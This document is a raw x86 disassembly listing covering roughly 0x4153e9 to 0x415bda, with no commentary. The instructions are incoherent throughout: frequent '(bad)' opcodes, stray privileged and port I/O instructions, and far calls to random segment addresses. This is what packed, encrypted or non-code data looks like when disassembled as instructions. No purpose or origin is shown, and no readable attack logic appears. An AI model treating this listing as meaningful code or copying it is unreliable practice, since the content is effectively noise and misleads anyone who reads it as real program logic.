  4153e9:	aad    0x7b
  4153eb:	ret    0x41b2
  4153ee:	into   
  4153ef:	mov    es,WORD PTR [eax]
  4153f1:	mov    bl,0x4d
  4153f3:	jmp    0x415379
  4153f5:	or     al,0xfb
  4153f7:	loop   0x4153c4
  4153f9:	not    BYTE PTR ds:[edi+0x6d69fbf5]
  415400:	mov    dl,0xba
  415402:	sbb    edx,DWORD PTR [ecx-0x3e]
  415405:	test   BYTE PTR es:[edi-0x6fe9db97],cl
  41540c:	in     al,dx
  41540d:	fstp   DWORD PTR [edx+0x38fec323]
  415413:	mov    bl,0xdc
  415415:	aaa    
  415416:	or     BYTE PTR [edi],ch
  415418:	mov    dl,0xc9
  41541a:	xor    cl,BYTE PTR ds:0x469fe7fb
  415420:	mov    dl,0x8a
  415422:	xchg   esp,eax
  415423:	xchg   esp,eax
  415424:	lock addr16 push esi
  415427:	daa    
  415428:	cmc    
  415429:	or     esp,esp
  41542b:	scas   al,BYTE PTR es:[edi]
  41542c:	cli    
  41542d:	pop    ebx
  41542e:	into   
  41542f:	stc    
  415430:	shl    DWORD PTR [eax+ebp*2-0x6d],0xad
  415435:	dec    ebx
  415436:	or     al,0x0
  415438:	cmc    
  415439:	hlt    
  41543a:	fild   DWORD PTR [edx-0x3810c900]
  415440:	(bad)  
  415441:	mov    ebp,0x38a0a776
  415446:	scas   al,BYTE PTR es:[edi]
  415447:	inc    edi
  415448:	rcr    BYTE PTR [ebp+0x71],0x9
  41544c:	scas   eax,DWORD PTR es:[edi]
  41544d:	fwait
  41544e:	xchg   ebp,eax
  41544f:	sahf   
  415450:	jb     0x4153f1
  415452:	das    
  415453:	ror    bl,cl
  415455:	scas   al,BYTE PTR es:[edi]
  415456:	loopne 0x4153f8
  415458:	scas   eax,DWORD PTR es:[edi]
  415459:	in     eax,dx
  41545a:	inc    eax
  41545b:	pop    edi
  41545c:	mov    ecx,0xe4bc0a1b
  415461:	pop    esp
  415462:	test   DWORD PTR [eax-0x52],edi
  415465:	(bad)  
  415466:	fidiv  DWORD PTR [ebx-0xcf4cfd]
  41546c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41546d:	or     ecx,eax
  41546f:	iret   
  415470:	imul   eax,DWORD PTR [eax-0x80ed71c],0xffffff9a
  415477:	scas   al,BYTE PTR es:[edi]
  415478:	arpl   cx,si
  41547a:	(bad)  
  41547b:	(bad)  
  41547c:	test   eax,0x1bf7f4c8
  415481:	mov    ecx,0xb357b983
  415486:	push   esp
  415487:	out    0x84,eax
  415489:	ficom  DWORD PTR [ebx+eax*4]
  41548c:	mov    ebp,0xc7079a79
  415491:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415492:	or     BYTE PTR [ebx],dl
  415494:	test   esp,edx
  415496:	sub    edi,DWORD PTR [eax+0x277733b8]
  41549c:	in     eax,dx
  41549d:	popa   
  41549e:	sub    dh,0xf2
  4154a1:	cmc    
  4154a2:	fwait
  4154a3:	jmp    0xf3b2027f
  4154a8:	push   ss
  4154a9:	sub    DWORD PTR [edx-0x4e],0x458908e2
  4154b0:	jb     0x4154df
  4154b2:	stos   DWORD PTR es:[edi],eax
  4154b3:	aam    0x2
  4154b5:	(bad)  
  4154b6:	(bad)  
  4154b7:	imul   esi,DWORD PTR [edx+0xe5d9776],0xfffffffe
  4154be:	add    BYTE PTR [esi+ecx*2-0x47df9f5],ch
  4154c5:	pop    ecx
  4154c6:	(bad)  
  4154c7:	mov    dl,0xaa
  4154c9:	sub    DWORD PTR [ebx-0x5ef6aaad],0x58
  4154d0:	push   edx
  4154d1:	div    bl
  4154d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154d4:	dec    esp
  4154d5:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154d7:	ret    0x62d
  4154da:	and    ah,BYTE PTR [edi]
  4154dc:	jp     0x4154c3
  4154de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154df:	lods   eax,DWORD PTR ds:[esi]
  4154e0:	repz mov esp,DWORD PTR [edx-0x79d44b7e]
  4154e7:	sbb    BYTE PTR [ebx+ecx*1+0x234d9251],ah
  4154ee:	mov    esp,0x9a127aa6
  4154f3:	shr    BYTE PTR [edx+edi*4-0xee3978f],0xed
  4154fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154fc:	inc    esp
  4154fd:	call   0x26f0291d
  415502:	test   DWORD PTR [edx+ecx*2],esp
  415505:	into   
  415506:	call   0xf237:0xc1461847
  41550d:	sub    DWORD PTR [esi-0x59],0xff426f98
  415514:	mov    cl,BYTE PTR [edi+0x15]
  415517:	mov    edx,0xee5eb5ad
  41551c:	mov    bl,0xa8
  41551e:	inc    ebp
  41551f:	inc    edi
  415520:	and    eax,0x12996a28
  415525:	add    al,0x90
  415527:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415528:	xchg   DWORD PTR [ebx+edi*8],eax
  41552b:	lock or ah,BYTE PTR [ecx+esi*1+0x6f]
  415530:	cmp    DWORD PTR [edx+ebx*4+0x79],eax
  415534:	push   0x1e
  415536:	je     0x4155b6
  415538:	and    edi,DWORD PTR [edx+0x7cf9a707]
  41553e:	in     eax,0x5e
  415540:	out    0x17,al
  415542:	adc    eax,0xf8c6b25b
  415547:	fistp  WORD PTR [edi]
  415549:	push   0x79
  41554b:	jne    0x415559
  41554d:	sbb    BYTE PTR [edx],cl
  41554f:	test   DWORD PTR [eax+0x22c410b],edi
  415555:	adc    ebp,esi
  415557:	sahf   
  415558:	mov    cs,edx
  41555a:	mov    cl,0xa0
  41555c:	sbb    dl,dl
  41555e:	in     al,0xe1
  415560:	bound  edx,QWORD PTR [edi]
  415562:	ins    BYTE PTR es:[edi],dx
  415563:	mov    eax,0xa1b80ba0
  415568:	bound  ebx,QWORD PTR [edx]
  41556a:	sub    DWORD PTR [edi-0x6c],edx
  41556d:	in     al,0x77
  41556f:	pop    ebx
  415570:	int3   
  415571:	icebp  
  415572:	call   0xc619:0xb31f9794
  415579:	lods   eax,DWORD PTR fs:[esi]
  41557b:	mov    al,ds:0xd63bb276
  415580:	sbb    bh,BYTE PTR [ebx+0x30]
  415583:	mov    ebp,DWORD PTR [eax-0x1d]
  415586:	popf   
  415587:	pop    esi
  415588:	mov    eax,0x826bba28
  41558d:	js     0x4155cc
  41558f:	out    0xe7,eax
  415591:	or     eax,DWORD PTR [eax+0x8315b47]
  415597:	sub    cl,BYTE PTR [edx+esi*1+0x243e4b94]
  41559e:	enter  0x50c7,0xb7
  4155a2:	cwde   
  4155a3:	test   esi,edx
  4155a5:	loope  0x4155b7
  4155a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155a8:	es out dx,al
  4155aa:	xchg   ebx,eax
  4155ab:	pop    ss
  4155ac:	cmp    bh,BYTE PTR [edi-0x4616f67]
  4155b2:	pop    edx
  4155b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155b4:	mov    dl,0x7a
  4155b6:	cmp    BYTE PTR [esi+ecx*4-0x675882e9],bl
  4155bd:	mov    edx,0x4c12c4f0
  4155c2:	inc    ecx
  4155c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155c4:	mov    dl,0xcd
  4155c6:	hlt    
  4155c7:	jno    0x415595
  4155c9:	cmp    eax,0x3518217f
  4155ce:	pushf  
  4155cf:	xor    DWORD PTR [edx],0x36
  4155d2:	fs add eax,eax
  4155d5:	mov    ah,0x3f
  4155d7:	div    DWORD PTR [edx+0x4a0bcb7e]
  4155dd:	xchg   esi,eax
  4155de:	jecxz  0x41557b
  4155e0:	inc    ecx
  4155e1:	repz mov al,0xa4
  4155e4:	js     0x415631
  4155e6:	sbb    esi,edx
  4155e8:	stc    
  4155e9:	add    DWORD PTR [ebx-0x54961611],ebx
  4155ef:	cmp    cl,dh
  4155f1:	xchg   DWORD PTR [edx+0x30],ebx
  4155f4:	nop
  4155f5:	or     edx,eax
  4155f7:	call   0x44c5:0xfe8acd3c
  4155fe:	call   0x7f6b:0x220e9149
  415605:	xchg   edx,eax
  415606:	out    dx,al
  415607:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415608:	inc    ebp
  415609:	shl    DWORD PTR [edx-0x16],0xec
  41560d:	dec    edx
  41560e:	or     BYTE PTR [edx+esi*4-0x5d],dl
  415612:	and    BYTE PTR [ebx-0x481ca5ae],ah
  415618:	xchg   ebx,eax
  415619:	sbb    DWORD PTR [edx],ebx
  41561b:	ins    DWORD PTR es:[edi],dx
  41561c:	pusha  
  41561d:	or     esi,eax
  41561f:	jno    0x4155e3
  415621:	imul   edx,DWORD PTR [eax-0x4645439d],0xfa0bfb3e
  41562b:	dec    ebp
  41562c:	jmp    0x415652
  41562e:	mul    DWORD PTR [esi+0x1bf17070]
  415634:	repnz retf 0x5f2f
  415638:	stc    
  415639:	push   ecx
  41563a:	retf   0xc1e
  41563d:	addr16 call 0xc034:0x4916534f
  415645:	cmp    ebp,DWORD PTR [esi-0x58]
  415648:	sbb    al,0xae
  41564a:	xor    dh,BYTE PTR [bp+si]
  41564d:	int    0x7a
  41564f:	imul   eax,ebx,0x80779a27
  415655:	push   ecx
  415656:	sbb    eax,0x82b2e4b3
  41565b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41565c:	cmc    
  41565d:	add    eax,DWORD PTR [edx+0x4d]
  415660:	xchg   ecx,eax
  415661:	test   eax,0xdeb28ba4
  415666:	xchg   edi,eax
  415667:	aas    
  415668:	sub    al,0x5e
  41566a:	hlt    
  41566b:	call   0x2de17d86
  415670:	sub    DWORD PTR [ebx],ecx
  415672:	xor    ch,BYTE PTR [eax-0x59d57d72]
  415678:	scas   al,BYTE PTR es:[edi]
  415679:	mov    edi,0xa52af27b
  41567f:	jp     0x415609
  415681:	add    BYTE PTR ds:0x37cb6a4,ch
  415687:	out    0x52,eax
  415689:	outs   dx,BYTE PTR ds:[esi]
  41568a:	jp     0x415625
  41568c:	stos   BYTE PTR es:[edi],al
  41568d:	dec    ebp
  41568e:	call   0x4e1d:0xa25b1667
  415695:	add    al,0xdd
  415697:	pop    ebp
  415698:	cmp    BYTE PTR [ebx],cl
  41569a:	mov    al,ds:0xb9a17525
  41569f:	sub    bl,dl
  4156a1:	pop    ss
  4156a2:	call   0x9e5e:0x972c8eaf
  4156a9:	shl    dh,1
  4156ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156ac:	push   esi
  4156ad:	jb     0x4156a9
  4156af:	mov    eax,ds:0xf2273282
  4156b4:	mov    dl,0x4a
  4156b6:	mov    al,cl
  4156b8:	inc    esp
  4156b9:	and    eax,DWORD PTR [eax-0x5debebc4]
  4156bf:	test   BYTE PTR [ebp+0x48e542cb],cl
  4156c5:	call   0xc44be9ba
  4156ca:	xchg   ebp,eax
  4156cb:	js     0x415678
  4156cd:	stc    
  4156ce:	aas    
  4156cf:	inc    edi
  4156d0:	dec    ecx
  4156d1:	dec    esp
  4156d2:	inc    eax
  4156d3:	outs   dx,DWORD PTR ds:[esi]
  4156d4:	loope  0x4156e1
  4156d6:	cmp    ah,BYTE PTR [ecx]
  4156d8:	int    0x61
  4156da:	add    DWORD PTR [edi],ecx
  4156dc:	inc    esi
  4156dd:	outs   dx,BYTE PTR ds:[esi]
  4156de:	call   0x7530:0xe8f59ae7
  4156e5:	mov    edx,0xf6d69f57
  4156ea:	sbb    al,BYTE PTR [esi-0x13709326]
  4156f0:	mov    eax,fs:0x2480ce9a
  4156f6:	pop    ss
  4156f7:	fimul  DWORD PTR [ecx+0x2a55f97]
  4156fd:	mov    ecx,0x63445786
  415702:	jp     0x415727
  415704:	cmp    al,0x5
  415706:	popf   
  415707:	fstp   QWORD PTR es:0x94821c50
  41570e:	loopne 0x41575b
  415710:	lahf   
  415711:	or     ecx,DWORD PTR [esi+0x272f1963]
  415717:	int3   
  415718:	loope  0x415719
  41571a:	call   0xb67d:0xe24f0860
  415721:	push   esi
  415722:	sbb    ebp,edi
  415724:	pop    esi
  415725:	stos   DWORD PTR es:[edi],eax
  415726:	jmp    0xd483:0xe76bb206
  41572d:	(bad)  
  41572e:	setb   BYTE PTR [ebp+0x4]
  415732:	sbb    eax,DWORD PTR [eax]
  415734:	mov    DWORD PTR [eax-0x1e6e1e27],ebp
  41573a:	add    DWORD PTR [ecx],ecx
  41573c:	jb     0x4156d3
  41573e:	mov    al,al
  415740:	mov    esp,0xc9ff608c
  415745:	retf   
  415746:	nop
  415747:	sbb    eax,0xa7db0538
  41574c:	mov    esi,0xc60f7a2d
  415751:	push   bx
  415753:	mov    ebx,0x67ccb2b2
  415758:	stc    
  415759:	or     ch,bl
  41575b:	std    
  41575c:	enter  0x9f0c,0x27
  415760:	adc    DWORD PTR [ebx],0xa2f14656
  415766:	sbb    eax,DWORD PTR [edi+0x2f6e9bea]
  41576c:	mov    dl,0xc4
  41576e:	sbb    al,0x35
  415770:	sbb    BYTE PTR [esi+0x14d37f9e],0xa0
  415777:	sbb    ecx,edx
  415779:	retf   0x615f
  41577c:	les    edx,FWORD PTR [ebx-0x77]
  41577f:	inc    edi
  415780:	(bad)
  415783:	fist   WORD PTR [edx-0x525834cb]
  415789:	out    dx,al
  41578a:	jns    0x4157c1
  41578c:	add    BYTE PTR [edi-0x24],al
  41578f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415790:	(bad)  
  415791:	(bad)  
  415792:	mov    ecx,0x54f4f7b
  415797:	pop    edi
  415798:	mov    bl,0x98
  41579a:	call   0x41ed:0x79ff250c
  4157a1:	inc    ebx
  4157a2:	imul   esp,DWORD PTR [eax+0x62a1468c],0x66
  4157a9:	jmp    0x4157d5
  4157ab:	jmp    0x4157a8
  4157ad:	adc    eax,0x5c575c9a
  4157b2:	sub    cl,0xc8
  4157b5:	push   0xffffff9d
  4157b7:	dec    ebp
  4157b8:	mov    al,0xb
  4157ba:	(bad)  
  4157bb:	call   0x3f43:0x7ff08b58
  4157c2:	popf   
  4157c3:	out    dx,eax
  4157c4:	mov    esi,0x825a86ba
  4157c9:	mov    ?,WORD PTR [ebp-0x34e6829b]
  4157cf:	inc    edx
  4157d0:	mov    edx,DWORD PTR [esi]
  4157d2:	enter  0xb0a7,0xd
  4157d6:	test   ebp,edx
  4157d8:	xchg   esi,eax
  4157d9:	adc    bl,BYTE PTR [ebp-0x52938932]
  4157df:	push   esp
  4157e0:	mov    eax,ds:0xe4179ef1
  4157e5:	xor    DWORD PTR [eax],0xffffffa8
  4157e8:	pop    ebx
  4157e9:	push   ecx
  4157ea:	shl    DWORD PTR [eax+0x529327f2],0xb4
  4157f1:	es call 0xeac2:0x1fb1649f
  4157f9:	aas    
  4157fa:	xchg   ebp,eax
  4157fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157fc:	and    bl,bh
  4157fe:	jmp    0x415792
  415800:	xor    eax,0xb2d55cb3
  415805:	dec    ecx
  415806:	loop   0x415800
  415808:	mov    BYTE PTR [ebp+0xbe88ae1],ah
  41580e:	lock jmp 0x415797
  415811:	xor    al,0x2e
  415813:	sbb    al,0x9e
  415815:	call   0x7df4:0xf8b1
  41581b:	aad    0xb7
  41581d:	(bad)  ss:[edi+0x4d0d5e91]
  415824:	push   esi
  415825:	idiv   DWORD PTR [esi-0x65d835e2]
  41582b:	or     eax,0x812193c9
  415830:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415831:	std    
  415832:	sbb    eax,0x82e511a0
  415837:	(bad)  
  415838:	add    BYTE PTR [edx+ecx*8+0x17],ch
  41583c:	and    eax,DWORD PTR [edi-0x17]
  41583f:	jnp    0x4157f3
  415841:	cmp    DWORD PTR [eax+0x11],ebp
  415844:	inc    ebp
  415845:	sub    bl,BYTE PTR [edi+0x670bde19]
  41584b:	lea    eax,[esi]
  41584d:	in     al,0x70
  41584f:	dec    edi
  415850:	jbe    0x4157fc
  415852:	fwait
  415853:	jge    0x415893
  415855:	sub    cl,al
  415857:	cmp    dl,bl
  415859:	jmp    0x7e492eac
  41585e:	fsub   DWORD PTR [edi-0x6b574f01]
  415864:	and    eax,0xb7b2e089
  415869:	xchg   edx,eax
  41586a:	xchg   edi,eax
  41586b:	call   0x1cb2:0x615fddfe
  415872:	popf   
  415873:	or     BYTE PTR [edi],dl
  415875:	loop   0x415833
  415877:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415878:	sahf   
  415879:	rol    DWORD PTR [ecx-0x3e],cl
  41587c:	lds    ebx,FWORD PTR [edi+0x7eb2fb98]
  415882:	adc    al,0x7d
  415884:	stc    
  415885:	mov    ds:0xb129276,al
  41588a:	loop   0x41583d
  41588c:	enter  0x28de,0x0
  415890:	arpl   WORD PTR [eax-0x65],bp
  415893:	push   edx
  415894:	jmp    0xfee0bf39
  415899:	ins    DWORD PTR es:[edi],dx
  41589a:	arpl   WORD PTR [esi+0x72],ax
  41589d:	js     0x4158cc
  41589f:	mov    eax,0x6734efb7
  4158a4:	mov    al,ds:0x3fdb94e7
  4158a9:	ss call 0x2e89:0x55625b64
  4158b1:	shl    ebp,0xb8
  4158b4:	dec    edx
  4158b5:	and    BYTE PTR ds:0xd4a1427,bh
  4158bb:	adc    bl,ch
  4158bd:	das    
  4158be:	call   0x1d75:0x381329f2
  4158c5:	dec    edi
  4158c6:	xlat   BYTE PTR ds:[ebx]
  4158c7:	lods   al,BYTE PTR ds:[esi]
  4158c8:	dec    eax
  4158c9:	fwait
  4158ca:	lea    ebp,[ebx+esi*1+0x33]
  4158ce:	fild   DWORD PTR [ebp-0x9]
  4158d1:	imul   ebx,DWORD PTR [esi+0x4c],0xffffffbd
  4158d5:	add    eax,0x6b710dbe
  4158da:	repnz adc al,0xff
  4158dd:	jmp    0xae9a:0x3ba19d88
  4158e4:	adc    BYTE PTR [ebx],ch
  4158e6:	iret   
  4158e7:	(bad)  
  4158e8:	bound  ecx,QWORD PTR [esi-0x66]
  4158eb:	xor    DWORD PTR [edx+0x19c9c8f1],ebx
  4158f1:	test   BYTE PTR [edi-0x2d],dh
  4158f4:	ror    BYTE PTR [ebx],1
  4158f6:	(bad)  
  4158f7:	cld    
  4158f8:	mov    edi,0x93981bbd
  4158fd:	rcr    DWORD PTR [edx+0x6c5cffd5],0xe6
  415904:	and    DWORD PTR [ecx+eax*4],edx
  415907:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415908:	stos   DWORD PTR es:[edi],eax
  415909:	mul    bh
  41590b:	adc    ecx,DWORD PTR [edi+edi*8-0x294d9715]
  415912:	mov    ch,0x63
  415914:	xchg   esp,eax
  415915:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415916:	in     eax,dx
  415917:	scas   eax,DWORD PTR es:[edi]
  415918:	repnz or al,0x91
  41591b:	out    0xb7,al
  41591d:	push   ds
  41591e:	xchg   edi,eax
  41591f:	out    0xc7,eax
  415921:	fld    TBYTE PTR [ebp+ecx*4-0x48cc9e4b]
  415928:	sub    bh,BYTE PTR [ecx]
  41592a:	retf   0x2c16
  41592d:	pop    ebp
  41592e:	jge    0x4158d7
  415930:	fbstp  TBYTE PTR ds:0x8c0dc49
  415936:	mov    WORD PTR ds:0xe74f7bc,gs
  41593c:	jbe    0x4159a7
  41593e:	loop   0x4159ba
  415940:	mov    esi,0x1551534b
  415945:	or     edx,DWORD PTR [ebp+0x1f]
  415948:	pop    edi
  415949:	mov    esi,DWORD PTR [ebp-0x68]
  41594c:	popa   
  41594d:	mov    dh,0x9a
  41594f:	shl    DWORD PTR [esi+0x77],0xe9
  415953:	mov    al,ds:0xa7a2133b
  415958:	mov    al,0x61
  41595a:	sahf   
  41595b:	sbb    ebp,ebx
  41595d:	add    al,0x9f
  41595f:	in     eax,dx
  415960:	mov    dl,0xb0
  415962:	or     ah,BYTE PTR [edi-0x42]
  415965:	scas   al,BYTE PTR es:[edi]
  415966:	fld    DWORD PTR [edi]
  415968:	inc    ecx
  415969:	or     ebp,DWORD PTR [ecx+0x762ef017]
  41596f:	cld    
  415970:	dec    edi
  415971:	xor    bl,BYTE PTR [edx+0x4ea0482b]
  415977:	inc    ebx
  415978:	std    
  415979:	stc    
  41597a:	or     dl,dh
  41597c:	adc    ecx,DWORD PTR [ebx]
  41597e:	add    BYTE PTR [esi+0x18],cl
  415981:	xchg   esp,eax
  415982:	jno    0x415988
  415984:	cmp    ch,cl
  415986:	call   0x89b1:0x86b2c570
  41598d:	push   edx
  41598e:	push   edi
  41598f:	mov    edx,0xe7321a07
  415994:	push   ss
  415995:	lea    edx,[edi-0x65ae7c72]
  41599b:	inc    esi
  41599c:	mov    dh,0x95
  41599e:	adc    al,BYTE PTR [edi+ebp*4]
  4159a1:	bound  edx,QWORD PTR [ebx-0x21]
  4159a4:	pop    edx
  4159a5:	or     cl,al
  4159a7:	pop    edi
  4159a8:	daa    
  4159a9:	mov    dl,0xe4
  4159ab:	xor    eax,0x27277bc8
  4159b0:	sahf   
  4159b1:	jmp    0xe11a:0x22ae3382
  4159b8:	adc    DWORD PTR [esi+0xa5aadbe],0xffffffb9
  4159bf:	call   0x4be3:0x95117885
  4159c6:	push   ss
  4159c7:	popf   
  4159c8:	std    
  4159c9:	or     al,0x9a
  4159cb:	pop    ecx
  4159cc:	outs   dx,DWORD PTR ds:[esi]
  4159cd:	xchg   edi,eax
  4159ce:	push   ebx
  4159cf:	xor    ecx,esi
  4159d1:	xchg   ebx,eax
  4159d2:	mov    esp,DWORD PTR [edi-0x2bc8d965]
  4159d8:	test   DWORD PTR [esi+ecx*2],ebx
  4159db:	xchg   ebx,eax
  4159dc:	mov    dl,0x61
  4159de:	jo     0x415972
  4159e0:	mov    ds:0x33a6627,al
  4159e5:	or     eax,edi
  4159e7:	xchg   DWORD PTR [ecx],edi
  4159e9:	mov    bl,0xd
  4159eb:	pop    eax
  4159ec:	arpl   WORD PTR [edi],cx
  4159ee:	call   0x3dd2:0x549fad11
  4159f5:	cli    
  4159f6:	pusha  
  4159f7:	mov    ds:0x7444f03c,al
  4159fc:	cli    
  4159fd:	mov    WORD PTR [edi],cs
  4159ff:	out    0xa,eax
  415a01:	fbstp  TBYTE PTR [esi-0x6996733a]
  415a07:	scas   al,BYTE PTR es:[edi]
  415a08:	out    0xd0,al
  415a0a:	sub    ah,BYTE PTR [edi]
  415a0c:	in     al,dx
  415a0d:	fist   DWORD PTR [eax+esi*8]
  415a10:	call   0xb488:0xa66ca40b
  415a17:	rcl    BYTE PTR fs:[ecx],0x99
  415a1b:	or     edx,ebx
  415a1d:	cmp    BYTE PTR [ecx+0x16fb0cc8],dl
  415a23:	adc    al,BYTE PTR [ebx+0x2abedc0b]
  415a29:	cmc    
  415a2a:	rep stos DWORD PTR es:[edi],eax
  415a2c:	mov    edi,0x1dad995e
  415a31:	push   eax
  415a32:	sbb    esi,esp
  415a34:	xchg   ecx,eax
  415a35:	loop   0x415a54
  415a37:	jnp    0x415a8f
  415a39:	inc    ecx
  415a3a:	and    ah,BYTE PTR [edi-0x59d09d89]
  415a40:	cmp    eax,0xb15d1c64
  415a45:	mov    ss,edx
  415a47:	pop    ebx
  415a48:	push   ss
  415a49:	xchg   ecx,eax
  415a4a:	xchg   esi,eax
  415a4b:	pop    ss
  415a4c:	sub    eax,0x54a0d71b
  415a51:	inc    eax
  415a52:	xchg   ebp,eax
  415a53:	lods   eax,DWORD PTR ds:[esi]
  415a54:	push   cs
  415a55:	sbb    dl,ah
  415a57:	push   esp
  415a58:	inc    edx
  415a59:	cmp    ch,BYTE PTR [eax]
  415a5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a5c:	(bad)  
  415a5d:	shl    DWORD PTR [esi],1
  415a5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a60:	pushf  
  415a61:	pop    ecx
  415a62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a63:	popa   
  415a64:	xor    al,0xc3
  415a66:	lds    esi,FWORD PTR [ecx]
  415a68:	mov    BYTE PTR ds:0x8187bbd,dl
  415a6e:	shr    BYTE PTR [ecx],cl
  415a70:	sbb    edx,ecx
  415a72:	push   0xffffff81
  415a74:	(bad)  
  415a75:	das    
  415a76:	xchg   ebx,eax
  415a77:	or     ebp,DWORD PTR [esi]
  415a79:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a7b:	shl    BYTE PTR [ebx+0x677a655a],1
  415a81:	jmp    0x415a18
  415a83:	fnsave [edi+ecx*8-0x51a7a3c2]
  415a8a:	adc    BYTE PTR [edi+0x1043bd73],ah
  415a90:	push   edx
  415a91:	cmp    bl,ch
  415a93:	enter  0x4148,0x9a
  415a97:	jg     0x415a75
  415a99:	outs   dx,BYTE PTR ds:[esi]
  415a9a:	jge    0x415b15
  415a9c:	mov    al,ds:0xfca7d720
  415aa1:	das    
  415aa2:	sbb    ah,bl
  415aa4:	mov    eax,0xb294bad7
  415aa9:	je     0x415adc
  415aab:	jmp    0x415ad3
  415aad:	xchg   edx,eax
  415aae:	pop    esi
  415aaf:	mov    ds:0xa7f3f343,al
  415ab4:	rcl    esi,1
  415ab6:	popf   
  415ab7:	(bad)  
  415ab8:	mov    dh,0xa9
  415aba:	xchg   edi,eax
  415abb:	push   ebp
  415abc:	mov    bl,cl
  415abe:	and    BYTE PTR [esi-0x277d9873],ah
  415ac4:	xor    esp,edx
  415ac6:	push   edx
  415ac7:	ret    
  415ac8:	loop   0x415adf
  415aca:	ins    DWORD PTR es:[edi],dx
  415acb:	shl    eax,0xcb
  415ace:	lds    esi,FWORD PTR [edi]
  415ad0:	test   eax,0x8aec775e
  415ad5:	repnz dec esp
  415ad7:	sub    BYTE PTR [esi-0x49],al
  415ada:	inc    esi
  415adb:	(bad)  
  415adc:	cmp    dl,BYTE PTR [esi]
  415ade:	loopne 0x415b2d
  415ae0:	repnz inc edi
  415ae2:	outs   dx,DWORD PTR ds:[esi]
  415ae3:	or     DWORD PTR [eax-0x193ce10d],0x58675cf0
  415aed:	xchg   edx,eax
  415aee:	mov    DWORD PTR [edx],ecx
  415af0:	mov    dl,0xb1
  415af2:	adc    eax,0x8f9f5e92
  415af7:	jbe    0x415b1a
  415af9:	or     ecx,DWORD PTR [edi]
  415afb:	loop   0x415b02
  415afd:	push   es
  415afe:	jns    0x415aca
  415b00:	and    eax,0x9a059d21
  415b05:	das    
  415b06:	icebp  
  415b07:	adc    DWORD PTR [edx-0x363448a],0x6eb97aed
  415b11:	cmp    dl,BYTE PTR [ebp-0x59]
  415b14:	add    ah,BYTE PTR [ebp+0x25]
  415b17:	sub    al,0xd4
  415b19:	fdiv   DWORD PTR [edx+0x6aa05aed]
  415b1f:	loopne 0x415ad3
  415b21:	mov    esi,0x5ab53c39
  415b26:	jge    0x415b37
  415b28:	test   eax,0x2fa6eae1
  415b2d:	lea    ebp,[eax]
  415b2f:	int3   
  415b30:	fcom   QWORD PTR [ecx-0x161b0d6]
  415b36:	cwde   
  415b37:	mov    BYTE PTR [edi+esi*1-0x34a78fb4],dh
  415b3e:	push   ebp
  415b3f:	xchg   DWORD PTR [ebx],ebx
  415b41:	in     eax,0x3c
  415b43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b44:	std    
  415b45:	xchg   esp,eax
  415b46:	xchg   ebx,eax
  415b47:	sub    cl,BYTE PTR [eax+0x73]
  415b4a:	push   eax
  415b4b:	sti    
  415b4c:	lods   eax,DWORD PTR ds:[esi]
  415b4d:	sbb    ecx,esi
  415b4f:	inc    edi
  415b50:	jae    0x415b40
  415b52:	gs jo  0x415b0b
  415b55:	jecxz  0x415b37
  415b57:	cmp    DWORD PTR [bx+di+0x5bcb],esi
  415b5c:	mov    dl,0xd1
  415b5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b5f:	push   es
  415b60:	xchg   esp,eax
  415b61:	(bad)  
  415b62:	mov    dl,0x91
  415b64:	add    ecx,DWORD PTR [edi]
  415b66:	rol    DWORD PTR [ebx],cl
  415b68:	sub    bl,BYTE PTR [ecx-0x61ff986c]
  415b6e:	ss push ds
  415b70:	mov    ch,0x2
  415b72:	sub    eax,0xaa4f33bb
  415b77:	sub    esp,DWORD PTR [esi-0x7e]
  415b7a:	jle    0x415b23
  415b7c:	loopne 0x415bf7
  415b7e:	sub    eax,DWORD PTR [ecx]
  415b80:	ja     0x415bda
  415b82:	scas   eax,DWORD PTR es:[edi]
  415b83:	xor    eax,0xb2c6c9b2
  415b88:	dec    ecx
  415b89:	out    0xa0,al
  415b8b:	jl     0x415ba0
  415b8d:	or     ebx,DWORD PTR [ecx]
  415b8f:	out    0x8c,al
  415b91:	push   ss
  415b92:	cmp    al,0x56
  415b94:	cmp    DWORD PTR [ebp-0x68],0x6829878f
  415b9b:	dec    esp
  415b9c:	mov    eax,0x74a76d5d
  415ba1:	popa   
  415ba2:	inc    esp
  415ba3:	sbb    BYTE PTR [ebx],0xe5
  415ba6:	mov    esp,0x89e9f682
  415bab:	pop    es
  415bac:	dec    esp
  415bad:	or     esp,DWORD PTR [ecx]
  415baf:	adc    dh,BYTE PTR [edi]
  415bb1:	or     WORD PTR [ebp-0x4269404e],bx
  415bb8:	mov    ds:0x36ba278c,eax
  415bbd:	xor    esi,DWORD PTR [edi+ecx*4-0x36]
  415bc1:	or     esi,DWORD PTR [edx-0x12]
  415bc4:	loop   0x415ba0
  415bc6:	repz mov cl,0xad
  415bc9:	std    
  415bca:	call   0x85ed:0x44e68f82
  415bd1:	ds cmc 
  415bd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bd4:	or     DWORD PTR ds:0x588941ec,eax
  415bda:	cs sahf 
